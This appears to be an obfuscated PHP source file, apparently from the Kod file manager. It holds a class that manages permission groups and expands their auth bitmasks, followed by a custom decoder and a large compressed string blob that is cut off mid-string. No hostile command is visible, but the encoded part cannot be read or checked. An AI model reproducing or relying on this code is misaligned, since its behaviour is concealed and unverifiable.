parent::update($èó»“ÒÁ, $×›±ë©â); } public function remove($ñ¯åã™µ) { $Û«—ı³ç = parent::listData($ñ¯åã™µ); if (!$Û«—ı³ç || $Û«—ı³ç[$_SERVER[íû‘ş´][179]]) { return !1; } return parent::remove($ñ¯åã™µ); } public function add($“×…¸Ê± = array()) { $Ø’íÜè× =& $_SERVER[íû‘ş´]; if ($this->findByName($“×…¸Ê±[$Ø’íÜè×[32]])) { return !1; } $Ÿª±ÒõÔ = array($Ø’íÜè×[32] => $Ø’íÜè×[12], $Ø’íÜè×[464] => 1, $Ø’íÜè×[1926] => $Ø’íÜè×[1913], $Ø’íÜè×[1925] => 1, $Ø’íÜè×[179] => 0, $Ø’íÜè×[1927] => 0); $“×…¸Ê± = array_merge($Ÿª±ÒõÔ, $“×…¸Ê±); $“×…¸Ê±[$Ø’íÜè×[1927]] = $this->getSort(); $this->filterAuth($“×…¸Ê±[$Ø’íÜè×[464]]); return parent::insert($“×…¸Ê±); } private function getSort() { $Ÿ†ìô¾ =& $_SERVER[íû‘ş´]; $äÍƒú¹ = parent::listData(); $¾óûòì = array_to_keyvalue($äÍƒú¹, $Ÿ†ìô¾[12], $Ÿ†ìô¾[1927]); return empty($¾óûòì) ? 0 : max($¾óûòì) + 1; } private function filterAuth(&$¯—±ÛÙ) { if (!$¯—±ÛÙ) { return; } $Æ’¯Ûè” = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $ø¦òõş = array(); foreach ($Æ’¯Ûè” as $‰ûÎ£Ë) { if ($¯—±ÛÙ & $‰ûÎ£Ë) { $ø¦òõş[] = $‰ûÎ£Ë; } } if (in_array(self::AUTH_ROOT, $ø¦òõş)) { $¯—±ÛÙ = array_sum($Æ’¯Ûè”); return; } $ôš¼µïÃ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($ø¦òõş as $‰ûÎ£Ë) { if (isset($ôš¼µïÃ[$‰ûÎ£Ë])) { $ø¦òõş = array_merge($ø¦òõş, $ôš¼µïÃ[$‰ûÎ£Ë]); } } $ø¦òõş[] = self::AUTH_SHOW; $¯—±ÛÙ = array_sum(array_unique($ø¦òõş)); } public function sort($û§Ëº“, $À³š„Ôú) { return parent::update($û§Ëº“, $À³š„Ôú); } } goto F ‹»ğÖ‚‚; EëÇ‰Á½Áš: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\215\355\373\221\376\264", "\270\370\342\236\204\331"); $_SERVER[íû‘ş´] = explode("\174\2\174\4\174\6", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\50\120\50\20\112\113\113\51\224\122\30\234\305\166\242\305\166\166\47\216\43\333\162\254\104\266\214\44\147\41\66\223\221".base64_decode('NJImljTyzMhbkrbQsBcoS1No+eEVaMu+lD0plLL+LbTQjaXQsmVhbUlpCZTSvrucu8w=')."\x48\x86\xff\x7d\xef\x7d\xdf\xb\x24\xba\xf7\xdc\x65\xee\x72\xee\xb9\xe7\x9e\x7b\xce\xb9\x67\x9e\x76\xc3\xf6\xb3\x1e\xd9\x7c\xc0\xe6\x3\x37\x7f\xfa\x95\x8b\xcf\xfe\xfd\xfd\x3b\x69\x78\xf3\xa7\xd0\x7f"."\373\323\360\11\347\36\262\37\371\163\344\271\347\64\64\364\54\230\66\247\357\63\27\334\161\223\366\351\216\107\337\177\370\216\47\56\377\375\113\117\134\237\314\54\333\176\171\356\370\375"."\x76\x74\xd9\xcb\x5b\x51\x56\x5a\xb2\x95\xfe\x28\x25\xd3\x51\xf4\x71\xc3\x76\x6c\xa\x48\x9b\xa5\xac\x91\xa3\x61\xa3\x44\x7f\x83\xf4\x67\x20\x1e\xb5\xf4\xa2\xe9\xe8\x34\x1a\xa0\x3f\x2a\xb4\x8a\xfc\x6b"."\x8f\x14\xc\x96\xae\xf6\xc5\x92\x6a\x62\xa0\xbf\x3f\x1c\x4f\x42\xa6\x56\x39\xbd\x68\x66\x20\x54\xd6\x2c\xad\x8\xdf\x2f\xeb\x96\x8d\x5a\x23\x57\xa7\x96\xcd\xb2\x5e\x72\x41\x4\x20\xa3\x39\x5a\x4a\xb3"."\xa1\xa6\xae\xe\xb5\x2b\xdc\x1f\x8d\xad\x53\x93\xeb\xfa\xc3\x90\x23\xa5\x8e\x54\x74\x6b\x82\xc6\x48\x30\xe1\x68\x96\x93\x34\x8a\x3a\xcf\x31\x66\xf1\x76\x75\x84\x57\x44\xfa\x94\x64\x3c\xd4\x97\x8\x75"."\46\43\261\76\12\356\214\365\366\106\222\325\360\170\54\32\355\10\165\256\252\116\351\217\207\126\364\206\24\324\276\202\256\32\245\254\331\240\154\240\51\33\224\106\32\350\66\364\102\206".base64_decode('Bksaa44zUYZQkofQNJUqhQKN9PFQRs9qlQKMVpccKVtGUWOdXqVPcCgNaBXHNEppGgk=')."\217\73\226\46\340\250\255\151\64\321\172\11\252\112\204\243\341\316\244\202\33\250\164\307\143\275\12\114\102\121\263\35\335\122\326\364\204\343\141\5\67\272\255\236\364\265\136\1\174\351".base64_decode('Q0OhhKJRZaoaHL1YZtXQMjUqi8W7wnGlY50iRihtFotmKYBqQTPpSE0Nx+M04AP0jkY=').base64_decode('8KRBJNbdnQjzGHTupChqyVzAT1csky046qhWqDA0Haa/9fADv6YNqDtilIwKoClUYZo=').strrev('e—|œÓ¤mbÁ(ÆfÒ—ª[¦œT¥2»ú2Û`ÒhyXMåDP g¢ërÂ AY|').base64_decode('oAw0njULGRa2jUnoStYo6H2VopyFR9N5o5Cx2Pr6uJw0GuXLFecVsTJqCV/pRnZCrDc=')."\234\257\237\247\332\146\305\112\353\21\264\76\150\274\31\300\272\343\240\316\301\330\30\346\100\271\140\152\231\204\156\361\256\31\146\67\252\50\126\161\144\140\205\144\353\66\255\142\27\242".base64_decode('DPB9tCqMgRoJw2xdZKQRCzasP9X/76H1y9E/jUD6BqFNeb1QUPVxHRZOMTPfZoMRtFM=')."\106\51\210\40\64\32\211\251\171\315\316\367\146\346\253\244\24\243\250\31\175\74\120\316\227\141\125\363\205\74\350\102\154\74\164\175\246\23\226\350\162\301\114\153\5\271\213\64\234\167"."\234\162\102\57\145\360\110\100\127\314\261\22\31\251\262\256\103\246\56\237\222\121\172\225\165\112\117\253\321\152\263\202\305\2\17\261\336\161\230\315\201\316\70\233\316\114\226\6\122\154"."\133\250\203\17\32\66\241\160\142\171\152\345\162\301\110\153\216\141\226\202\146\332\321\35\277\355\130\272\6\65\206\322\151\335\266\375\235\146\311\261\314\202\77\124\50\230\143\376\230\145".base64_decode('5IxSqzIbiC1KRIvajwlgK6zUuiUKRhz8mdltFSfrX8RWIM9taSU7q1v+MKyMVgU1llM=').base64_decode('QZaty7DLpm3g5rUqmuNo6TymIKL6to/Jb5QKRkmvyhseLxuWbrO2Kit6k1AJql3391s=')."\x5a\xae\xa8\xb5\x2a\xe5\x4a\xa\x8d\xc\xac\xd4\x1a\x30\x9a\x1b\x86\xa6\x55\x49\xe3\xa8\x4f\x29\x56\x6c\xc7\x6f\xe9\x88\x14\x19\x68\xbb\x83\x41\x8e\x64\xfd\xbd\x78\x5d\x19\x7a\xc6\x9f\x40\x14\x1b\xc0"."\163\233\346\51\10\165\24\226\106\241\75\311\144\277\32\351\106\133\162\137\130\355\15\45\73\173\240\331\216\226\143\155\216\42\72\314\253\144\300\265\176\264\276\60\162\365\241\276\12\140"."\277\71\246\133\350\303\35\23\255\312\260\231\111\231\343\1\226\204\63\47\20\241\141\231\361\164\227\35\177\134\53\345\360\370\244\46\34\335\366\222\252\16\264\201\7\262\164\61\7\122"."\172\326\264\240\67\366\150\316\75\27\121\275\224\163\362\254\356\104\70\276\72\34\127\23\261\356\344\232\120\34\366\373\22\102\244\161\326\32\374\365\202\77\256\147\320\354\244\35\126\116"."\x2b\xe3\x81\x65\x79\xf0\xfa\xc1\x1f\x67\xa9\x78\x4d\xb1\xb4\x68\x64\x5\x1e\xbb\x2e\xbf\x8d\x32\xf9\xe5\x5c\xac\xee\xa8\x51\x34\x70\xf7\x1c\x9e\x42\x6\x1b\x31\x3\x2b\xa0\x41\x41\xd2\xe7\xb6\x41\x7b"."\166\303\140\146\116\243\37\375\73\273\161\375\140\127\140\366\120\173\320\20\145\202\315\201\146\245\245\151\201\322\217\270\23\103\53\50\320\351\252\34\115\112\154\225\173\130\4\302\227\314"."\x92\xfe\x31\x83\x83\xb7\x37\x89\x32\x78\x86\x95\x2\xe3\xe1\x93\x6\xc2\x89\xa4\xda\x1b\x4e\xf6\xc4\xba\xe0\xeb\xe1\x10\x84\xa2\x26\x5d\xd9\xac\xb7\xeb\xe9\xcf\x10\x20\xc0\x10\xfd\x51\xd\xbb\x5b\xda"."\x79\x70\x94\x53\x28\xd5\x4c\x6d\x44\x93\xd1\xab\x33\x32\xc\x33\x1f\x29\x6a\x39\x69\x1f\x50\xdd\xdb\x4\x8e\xe1\xc4\x5e\x81\x1c\x8\xcb\xd6\x18\x19\xbe\x8f\xa0\x68\x8f\x6e\xe4\xf2\x30\x60\x6\xae\x2e"."\155\26\114\113\53\140\352\311\26\216\316\50\132\316\0\212\126\56\124\20\316\4\361\27\222\371\112\61\5\104\37\61\211\71\335\21\74\230\75\201\30\225\42\333\334\320\16\351\104\272".base64_decode('XFsYxIIqnufBQLmUa5wBdakt85swAFAUuoiY0YpePQaBtIkWRa82rLfiTgGJWUKgLCI=')."\321\236\45\170\273\150\363\256\51\74\117\205\100\21\125\102\352\354\64\371\6\107\331\375\45\356\355\102\321\55\313\264\116\204\34\44\254\220\75\7\317\33\124\356\360\35\334\106\313\207".base64_decode('hfMm3/FNC0KtQej3zJZuth8GE3PR/2Lzy5hFjW0lZBPQM3QXoKDZrpQeXRNsjGM5JoY=')."\x5a\xae\x2c\x8\x9f\xf2\x26\xe0\x35\x9a\x37\x68\x52\x85\xb7\x8d\xb5\x32\xa3\x17\x74\x86\xb\x79\x9d\x6d\xa4\x4d\x90\xd\x8d\x1d\xc7\x94\x2c\x47\x59\xc4\xf\x23\xa8\xe0\x60\xc\x3b\x8e\x4a\xe2\x6d\x8f"."\305\327\340\3\204\0\340\275\37\146\136\4\13\150\334\143\4\367\105\274\337\322\263\6\220\253\22\102\315\136\315\32\146\35\103\45\305\252\301\21\151\105\165\17\104\243\152\147\254\57"."\x89\xce\x1f\x14\xb2\x26\x1e\x49\x86\xd9\xa\xe\x75\xa9\xa1\xce\x7e\x1a\xe3\x3c\x9\xa1\xc1\xd5\x1b\x2c\x85\x8c\xb6\xc0\x24\xa3\x46\x4\x5\x27\x80\x36\xb5\xb2\x59\xb2\x75\x7f\x1a\x4a\x88\xd3\x49\x55"."\x52\x46\x6c\x94\x40\x67\xc5\xe6\xea\xd9\x2f\xc7\xfd\x5a\x71\xd2\x5f\x44\x24\xc0\xcf\x9b\xe7\x66\x53\x14\xd8\x40\x29\xb7\x13\x81\x69\x12\xfb\x1f\x1e\x3c\xb4\xa\x19\x7f\xd4\x1f\x4b\x40\x81\x76\xc\x45"."\x3c\x6a\x8a\x2f\x96\xfe\x1\x48\x2a\x4a\x28\xb2\x22\xc\xc0\x69\x80\x55\x79\xd\x38\xcf\xd0\x9a\x4\xdb\xbb\x2a\x28\xbf\x65\x4c\x6a\xa2\x4b\xed\xac\x3d\xac\x23\xc5\x82\x60\x79\xdd\xbd\xf2\x8b\x99\x47"."\125\316\363\367\364\206\72\375\211\236\120\313\374\5\24\272\256\230\31\114\366\30\366\340\311\74\16\343\66\146\317\123\55\35\221\7\126\163\113\123\63\133\274\210\321\220\332\263\316\137".strrev('F¨ÏÎêÁ˜ÿmŠ3KD+f’ªVL†RÍ}'."\0".'•Dy(s]XšššğZãô')."\227\31\356\255\3\252\250\20\336\116\325\322\370\143\52\252\321\251\330\362\320\240\165\224\101\205\14\306\312\122\250\126\310\241\121\166\362\105\31\50\146\232\306\165\312\141\361\311\342\243"."\x88\xc7\xb6\xd6\x6e\xc6\xd6\x3d\x62\xae\x26\xd8\x96\x5d\xab\xd\x6b\x6b\xb5\x61\xad\xa7\xd\x6b\xab\xdb\x40\x41\xb6\x91\x2b\xa1\x5e\xb2\x3d\x29\xd9\x13\xe9\x5b\xa5\xf6\xc6\xba\xc2\x51\x35\xd2\x87\xb6"."\340\144\65\174\240\277\53\304\126\252\14\357\210\45\173\134\320\1\264\11\257\16\105\43\336\354\341\265\221\104\62\121\63\11\301\6\302\236\224\256\16\265\77\36\356\216\254\345\321\356"."\110\70\332\225\120\73\103\235\75\42\117\137\250\67\314\167\136\275\220\261\203\356\374\52\342\46\22\134\270\241\216\142\101\15\303\102\325\45\117\120\331\111\131\25\304\2\61\226\72\14"."\70\164\27\213\207\110\117\124\206\244\25\306\353\360\103\125\221\355\6\105\15\150\244\306\70\302\6\372\323\250\204\22\212\123\126\71\335\117\115\360\40\351\6\213\243\255\14\276\257\0"."\147\123\325\2\25\347\351\220\330\317\332\200\120\326\341\174\215\47\216\250\234\110\103\63\20\42\162\50\204\11\144\106\340\63\6\242\231\226\23\142\315\311\12\31\220\32\353\17\307\103".base64_decode('WIKkronH+lZAgbG8zhoQgeFvYAcNECQ5YutBpwSNSRTEoG802VBupj+zgBSgIylQlhI=')."\x1b\xf5\x14\xde\x85\x19\x17\xc5\x2\x59\x44\xf6\xd8\xe\x6a\x56\xf8\xd7\x52\xa6\x59\x60\x4\x19\x31\xc2\x7c\x67\xe0\x82\xa8\x8d\x36\x43\x92\x71\xb6\xa7\xcc\xe1\xa4\xc\x50\x37\xb6\x2a\xdc\xa7\x32\xcc"."\242\61\11\33\51\40\34\217\307\342\60\40\216\71\314\344\23\64\61\36\116\60\162\216\311\246\301\206\53\30\230\3\130\254\43\146\3\76\37\74\145\160\154\116\303\172\377\234\300\20"."\12\64\316\136\116\243\20\33\14\270\242\214\201\253\130\274\64\76\37\64\330\355\215\255\203\301\301\140\103\173\353\372\220\177\122\363\117\66\371\27\373\207\20\333\327\70\7\0\103\233".base64_decode('WnzztuAMKGP79CH00zbYPnPQP+trG5avHxyqb51z4mBg+uDY0OzGdvaddMVCnCWjWKg=')."\251\231\71\15\250\111\350\334\300\263\224\310\336\46\145\140\11\223\106\131\100\67\55\330\302\340\150\16\365\234\50\261\336\77\70\147\250\135\52\47\201\274\337\102\224\24\155\264\171\236".base64_decode('L+Q/GfeMF8XrHvCjUkqLbQmvi5SWBjqAaKTg2h2Ly6zcJ9pNM+nvFjaROX2c719ZwwI=').strrev('C1‰\'ÅY^Le»iÂ Ïib’J>èÁÈGÜ=éŒî”ïÃ˜ô—5ÆŒ”¬ì')."\333\10\314\323\241\220\333\116\153\145\75\41\365\120\125\223\241\216\150\130\145\24\6\50\61\213\23\252\330\301\305\327\250\153\202\242\62\372\220\26\147\125\162\162\207\225\157\217\24\24"."\102\30\50\347\336\112\44\371\166\245\214\231\160\5\315\70\32\133\5\155\340\112\333\62\205\16\71\224\123\345\11\50\153\214\41\304\222\47\135\54\172\114\241\240\115\145\61\103\66\142"."\235\31\363\32\154\30\34\254\254\327\63\103\353\21\342\153\376\354\320\246\271\133\32\331\161\66\70\210\376\260\110\250\206\114\131\345\324\120\105\214\130\0\267\203\213\25\135\21\236\114"."\xa3\xa6\xc5\x39\xe0\xb2\xeb\xb4\xe8\x98\x8e\x56\x70\x55\x91\xc4\x10\x46\x9a\x18\x1f\x5\x2\x36\x3a\xdb\x51\x41\xb1\x30\xcf\x26\x9\xe3\x9\x39\xed\xe3\x2\x2d\xce\x8\x49\xd2\x60\x5c\x22\xa1\x3b\x1"."\236\303\47\45\252\50\356\272\30\151\253\143\304\276\204\226\123\247\264\325\121\61\147\202\234\55\135\22\174\133\327\254\164\276\273\122\50\70\374\310\132\60\206\341\13\260\126\340\102\301"."\17\273\301\234\132\105\273\115\213\111\207\146\103\63\352\146\327\312\30\51\225\314\114\112\106\65\261\311\256\10\41\166\46\251\64\60\341\267\22\351\123\72\142\261\150\70\324\247\340\375"."\34\366\41\304\54\44\302\375\41\264\211\141\71\123\42\31\6\171\174\244\313\317\352\135\353\147\7\145\36\60\330\376\247\145\101\172\24\51\171\41\154\374\12\272\212\266\166\25\316\34"."\260\321\165\204\22\221\116\265\77\304\30\50\255\134\16\332\231\141\73\210\273\207\116\303\121\43\25\304\342\131\174\133\24\340\2\114\140\33\321\362\112\17\253\132\12\55\34\46\27\251"."\x60\x29\xdf\xb0\xdc\x4\x40\xbf\x32\x65\x6c\x51\x3\xd0\xe1\x78\x98\x21\x9b\x2c\xb\xc0\x87\x1c\x1f\x3e\x91\xfb\x30\xf3\xe3\x43\xc3\xea\xc3\x87\x78\x9f\x38\x42\xfa\x84\x3c\xdc\x37\x6a\xe8\x63\x24\xc0"."\217\167\76\70\365\371\204\370\1\202\221\56\237\141\167\221\323\53\371\0\111\142\115\100\307\176\164\372\52\150\23\76\332\234\250\76\252\27\174\114\60\341\143\155\364\61\271\214\217\310"."\x53\xba\xa0\x59\x3\x68\xbd\x43\xb3\x48\x10\x91\xf5\xbc\xf\x63\x38\x5e\x60\x3e\x21\xa1\xf7\x99\x63\x25\xdd\x22\x59\x60\xe6\xc4\xc1\xd7\x27\xe\xc5\xbe\x9c\x65\x56\xca\xfd\xec\x9b\x52\x8c\x36\xb\x0"."\xa2\xcd\x1c\x10\x37\x4d\xc7\xc7\x44\x3d\x3e\x59\xe6\x3\xad\x8\xb1\x85\x5c\x73\x38\x6b\xf7\x86\x8c\xbf\xb7\x11\xb0\x0\x70\x52\xf5\x28\x7d\xc2\x64\x55\xcf\x87\x5b\xdc\xb5\x89\xd6\x8\xf2\xb4\x2d\x6c"."\33\166\345\41\322\46\316\36\343\1\27\241\325\202\222\340\16\164\153\160\27\104\253\225\303\174\5\225\334\53\111\10\343\305\65\214\140\306\275\342\14\357\5\15\376\150\122\313\45\244".base64_decode('zzlajn0LU1OUOmVWGo7r6Ym0kI90SVIXd6yCakhoWU+3fGQd1VoDteeY4zWfkmmHHso=')."\xc6\x98\x21\x3b\x9f\x5f\xd7\x1a\xf9\xe4\xd5\x9\xfd\x22\x34\x3a\x56\x16\x5c\xe\x6d\x2c\xde\x27\x12\x88\x78\x74\x17\xd8\xa0\xb4\xc8\xc9\xb0\x43\xf8\xdc\x31\xbc\xb8\x2\x64\xc7\x20\xf7\x9a\x9\x2e\x3a".strrev('Â7q4Š¹Ô±Õ´6ŠÚd(e+\\EÒFÒ—'."\r".'›ªâ’Ì¬Î*2Ò©†¯"ÊÊ“»†‹')."\307\242\112\65\342\341\341\226\7\1\243\3\351\276\330\76\31\50\46\166\353\12\260\246\232\15\207\104\54\170\204\220\316\140\142\152\145\274\224\310\215\0\260\166\271\276\213\243\142\115".base64_decode('MZRQ8Ad8EjOFSYpfrA4p6h5yD0Z69ng8RP1GacIoJYxiuVAFFWyC4FLw4hYxipVThek=').base64_decode('JoJlSLR+H9wn+vDWJHEQQkSIWk/2x6JLsl7dcqhIyiJGgEVdqxvwP69ZYmgZTcKEgec=').base64_decode('t3EWEZWyZbVRwU+5ykiUxXYmWF/koLtSGu3ykd8e1BV58fLJwlSFZaIECVGGKBo59EM=')."\72\222\64\175\130\236\215\176\350\246\316\56\232\111\46\266\12\52\305\56\220\217\343\360\152\104\16\30\33\211\206\277\201\221\23\340\175\124\111\202\301\311\221\233\71\240\55\11\161\142"."\x8f\xb6\x4c\xb4\xe1\xd1\x30\x3a\x6a\x14\xd0\x3e\x67\x5\xf0\xea\x59\x81\x77\x2b\x36\x3e\x94\xf0\xc9\xd8\x98\xd0\x51\x9f\xa1\x9c\xa8\x2d\x51\x95\x26\xe7\x16\x62\x4a\xbc\x11\x88\x8d\x83\x8d\xab\x58\x7c"."\356\371\247\241\234\150\20\36\132\265\272\35\30\267\153\307\273\55\223\363\345\174\317\367\146\352\44\7\137\256\73\340\331\247\245\361\160\361\26\125\40\251\214\227\313\360\100\75\121\61"."\x11\xae\x2d\x88\x82\xd8\x75\x86\x96\x29\x1a\xa5\x80\x45\xb7\xb6\x0\x3a\xce\x80\xbe\x87\xaf\x49\x62\xc4\x4\x5\xda\x44\xaf\x8c\x60\x2b\xdc\xe2\x99\x67\xc7\x34\xd1\x19\xd9\xa\x58\xe8\xcb\xa2\x41\x12"."\365\3\322\101\324\1\360\16\51\263\17\274\26\33\45\110\164\334\315\45\261\222\211\262\306\310\67\347\340\30\46\223\3\121\105\220\124\322\144\111\75\203\304\243\234\333\305\4\42\234"."\x31\x1c\xc\xc1\x4b\xce\x64\x37\x2c\x22\xa3\xd8\x32\x5\x4c\xa6\xd9\x64\xeb\xa9\x9a\x62\x71\xb6\xf1\xcd\x74\xe5\x74\xb3\xb\x0\x9c\x4d\xf6\xf4\x80\xe0\x6e\x6a\x2b\xba\xa4\xcd\x32\xcc\xbb\xa4\xe1\x55"."\x34\x47\x75\x9\x18\xb0\x1d\xb3\x2c\x52\xa4\x28\x4d\x96\x92\x44\xa5\x52\x2e\x3e\x15\xa4\x45\x68\x15\x65\x8\x4f\x2c\x86\x8c\xe4\x85\xb2\xe4\xc4\x4f\x17\x6a\x0\x1f\x21\x2\x32\xa1\xe\x59\x16\x43\x53"."\332\115\174\107\212\200\62\10\123\274\4\133\143\265\366\53\132\171\170\124\350\157\321\252\360\207\3\164\221\7\264\114\46\306\356\211\345\160\165\126\131\372\131\273\42\242\114\307\253\222".base64_decode('YrWzhwoFoYDjjU9ZhC5uuZAMmbJYNzlus1NdLRg/x0zNm3vvgd0EeWqeZQpSJqaxdhw=').base64_decode('7c6deaOkM6FQ1rDsWpTp/zNzXD3yeIVMhS44TZKTYz3SUV0+NHBhsKBEfKOuYj+ABZA=').base64_decode('Iqrj4qnipH5pObkwBC1fOh54Y4rEAvYUOOvNpzNROaGB43w/lQvhJDyXcqWCh/uY/Lw=')."\162\301\317\311\371\20\356\342\204\251\332\312\222\171\55\367\136\175\345\63\277\75\213\206\337\176\171\307\143\173\377\111\303\315\55\160\323\215\376\75\10\375\222\260\120\43\76\175\315\46".base64_decode('8yuPff7gc97btOhsf8PGnsQ1+bN7hy59pfOqrr2VS3auePWhv5UuWDry1/fuubv+ous=')."\xff\xd3\xfc\xc7\x59\xbf\x3e\xa1\x31\xfe\xfb\x83\xde\xb8\x2a\x3c\x7c\xc7\xf2\xc3\xee\xb8\xed\x53\xf3\x7a\x9e\x3a\xf0\xa3\x5\x7f\x98\xfe\xe2\x55\x9b\xee\xbe\x60\xc7\xf4\x9b\x92\x8a\xb3\xe3\xf6\xdb\x6f"."\237\173\373\317\46\12\357\375\142\337\25\377\172\351\27\373\316\74\344\163\373\275\361\363\310\176\133\276\367\325\345\207\35\371\337\153\176\224\313\154\173\362\350\303\126\357\75\377\221\306"."\7\336\235\74\365\361\307\216\237\166\306\350\306\33\267\275\377\237\276\323\264\243\137\155\76\341\244\324\347\316\374\366\73\221\67\356\361\335\172\355\340\176\373\77\322\165\316\305\35\237".base64_decode('3dR7wFej2tJHTv3jb2+ofG74ZLX9rfmLXr7r7e+Vt/2j+8/F0Pglj1+yfPeNl0+8/7s=')."\347\377\171\360\360\105\117\264\37\374\366\354\23\362\133\376\355\137\363\112\350\352\77\275\362\352\177\145\67\355\170\341\367\27\137\363\300\231\63\66\155\174\310\370\322\246\337\77\172\363".base64_decode('lT/55dVzDzstfvzOaacf2P7gEwtP3nDMU/sWT7R8/3xr8ePPvjDv3cgt2Q9+bHx4R2k=')."\272\36\150\273\55\367\315\324\361\205\135\253\76\375\343\344\222\103\236\70\361\345\322\223\35\351\255\373\266\346\367\71\53\127\335\333\173\310\271\23\47\236\374\375\17\277\330\372\166\217"."\xda\xb7\x77\xfa\xca\xc3\x16\x35\x2d\xbe\xa5\x43\xed\x19\x3b\x71\xde\x9c\xe9\xf9\x6f\xcd\x79\xf6\x8b\xbe\x33\x62\x37\x7e\x56\xdb\xa7\xf5\xff\xa0\xe9\x9d\x8f\x1a\x67\x65\x83\xcb\x4f\x7b\xe4\xd4\xd2\x3"."\53\266\365\156\376\343\21\147\366\356\337\161\374\61\17\316\132\175\310\205\63\106\137\271\64\25\74\373\127\147\134\370\275\325\327\74\366\276\363\335\326\263\236\74\364\270\226\372\275\315".strrev('û=¶»–ñıo¦ûû½½ğ8šŸÃ[Wqfše¾ÛÇ;-+é¸oN£cèÿm{§ûÎ7Î').base64_decode('7MEPneW76UdXDz0/b9fqo/s+99xRzzS37NIPjT/3bmq8vrBw/9Mr0eOUSxbu/X34mEs=')."\77\127\274\345\264\302\153\201\213\277\177\127\172\325\354\375\37\272\176\355\272\37\65\375\131\117\245\26\376\154\367\361\363\166\177\172\345\367\256\234\261\346\210\3\273\266\37\24\373\362".base64_decode('NO13o48Zvzx1XXQ8MBi7p+c3l7Se89vPX3r2PcPnr9hjfuH2I2fVa4ccfMi7+h/e+/k=')."\x7e\x3f\x7c\xe7\xd8\x53\x72\x9b\xdf\xbc\xfc\xd1\xe3\xce\x3b\x7a\xcf\xc1\xd3\xbe\xbb\xec\xb3\x67\xed\x3f\x3f\x7f\x44\xcf\x77\x1b\x8f\xbd\xe6\xe5\x47\xfc\xc1\x79\x47\xfd\xf6\x9e\xa7\xfe\xf6\xed\xd0\xc3"."\47\255\271\163\371\267\356\235\376\257\255\277\373\345\177\167\357\76\340\230\27\273\236\131\272\341\201\207\117\367\37\361\375\167\276\170\325\61\147\36\173\353\206\73\326\332\351\147\216\171".base64_decode('9s63ftD/mfjGHZ29XXcfdMAl8csuCNetKu7VD711+s739q49bease8/50iMnnNB93c0=').base64_decode('Fz21/9xL//GF27YvOvjl88a6nz3dvOLDJ3rarrvj4SN+fN5tx2xdvPi67CWFI7c2fH4=').strrev('Ùï?½éõ<¼=×\'í©ØÍûî¬‚ÿ7›ïçÓşı¾“´ëùû¨ö>‡[Øë8X£¸E').strrev('ø\\n[íì®úÿ*|®§Âõ¾Ø zús–¯ü»kà{½ŸÃÎí»{mGÅÍúŞ…Ï’ïÿ»')."\xc7\xcb\x47\x7\x9f\x7f\x7a\xd3\xdb\xa3\x5f\xbf\xad\x7c\xe2\x4b\x9f\xbd\xa5\x31\x5b\xb7\xe9\xe0\xf8\xae\x7f\x5c\x1a\x3c\xf5\x97\xe5\x5f\xbe\x75\xe4\xe9\xeb\xbe\x7c\xec\x45\x95\x35\x3f\x7c\x76\xb9\x7f"."\353\311\373\106\376\370\302\45\63\57\17\275\332\375\313\7\76\367\330\341\317\174\301\327\176\344\371\107\34\377\313\31\367\336\261\155\373\157\367\277\342\27\115\345\343\336\312\36\376\326"."\257\326\175\256\345\252\165\17\37\63\324\176\321\61\317\334\373\350\77\267\131\213\357\313\136\175\335\75\337\335\266\366\306\223\66\14\336\375\233\207\22\75\167\355\171\346\306\363\157\375"."\324\103\137\30\377\325\117\76\325\370\354\231\357\36\361\332\277\307\156\175\370\250\242\361\334\107\177\371\341\33\377\310\236\276\360\261\246\313\13\33\356\171\367\242\275\235\377\313\132\67"."\257\360\213\277\233\327\156\13\275\120\371\326\267\313\257\177\172\306\201\27\337\275\365\235\7\26\350\47\357\115\255\177\366\232\137\304\276\170\332\323\267\117\334\151\75\374\303\277\175\360"."\xb5\x1d\xd7\x9f\xf0\x87\xc9\xef\xbd\xf1\xe4\x21\x77\x28\x17\xee\x79\xfb\xbd\xf\xbf\x7a\xdf\x9a\x1b\x9e\x99\xbc\xf3\x8a\xa7\x36\x1c\x38\xb8\x66\xf7\x53\xdd\xab\xde\xbc\xfd\xdb\xbf\x99\xb3\x63\xd7\xea".strrev('åKùÇò/÷~½ûéÿ{ß[Òü¼½O‰´Øß}<ÏöıG3á¼—§àú^)|¬v')."\244\5\153\122\167\376\165\332\304\13\113\377\174\347\315\133\367\274\260\353\360\336\271\113\363\217\234\160\330\375\107\75\355\377\306\216\103\277\332\272\366\73\217\36\260\344\332\133\265\77"."\375\364\221\75\373\376\334\374\104\307\327\256\276\147\373\117\106\355\135\331\313\27\52\327\265\174\371\372\175\107\134\175\256\332\266\343\375\127\237\274\345\224\217\376\361\306\77\176\367\170"."\173\373\107\357\175\160\356\15\317\334\362\342\216\311\217\376\360\301\343\137\277\374\353\357\277\362\312\355\77\33\274\177\163\345\203\17\125\337\73\147\157\332\364\360\101\137\177\347\325\375"."\xef\xfd\xe8\xe2\x6b\x5e\xfc\xfb\xfb\xdd\x89\x59\x3f\xfa\xf6\xac\xf2\x85\x95\x13\xf5\xf7\x8f\x7f\xa6\x63\xf9\x35\xb7\x7f\xf3\xf3\xef\x5d\xf1\x93\xa7\x7e\xf1\xd9\x26\xdf\xc4\x1\xb\xe\x1c\x7a\xf3\xd1"."\375\17\170\164\321\326\27\126\316\270\346\330\17\315\227\235\247\267\235\327\164\333\223\33\256\157\136\163\254\357\252\105\207\367\374\374\364\213\272\376\162\352\103\235\353\126\47\257\117\64"."\154\317\235\174\361\212\313\306\326\74\175\374\55\177\72\371\17\253\26\137\130\72\354\53\37\74\66\147\370\206\17\67\125\156\72\371\47\117\134\354\74\367\233\55\217\75\263\242\345\270"."\xc5\x2b\x7f\x72\xee\x40\xcb\x67\x47\xcf\x69\xfe\xdb\x9c\xb